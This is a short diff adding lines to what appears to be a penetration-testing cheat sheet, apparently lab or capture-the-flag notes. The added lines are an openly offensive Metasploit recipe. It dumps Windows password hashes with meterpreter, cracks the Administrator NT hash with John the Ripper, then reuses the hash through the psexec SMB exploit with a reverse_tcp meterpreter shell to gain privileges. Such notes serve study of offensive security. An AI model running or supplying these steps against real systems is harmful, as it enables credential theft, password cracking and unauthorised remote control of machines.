@@ -211,4 +211,16 @@ useful cheatsheets https://pentestwiki.org/msfvenom-payloads-cheat-sheet/
 > cd c:\\
 > cd Users
 > cd Administrator
-> 
+> mterpreter> hashdump (copy the Administrator hash)
+> open new terminal
+> vim hash.txt (paste the entire hash)
+> sudo john --format=NT hash.txt (note the Administrator password and also can open using rdp) go back to meterpreter terminal
+> mterpreter> background
+> use exploit/windows/smb/psexec
+> set payload windows/meterpreter/reverse_tcp
+> set lport 4443
+> set rhosts target_machine_ip
+> set SMBuser Administrator
+> set SMBpass paste the hash
+> run
+> getprivs (done)
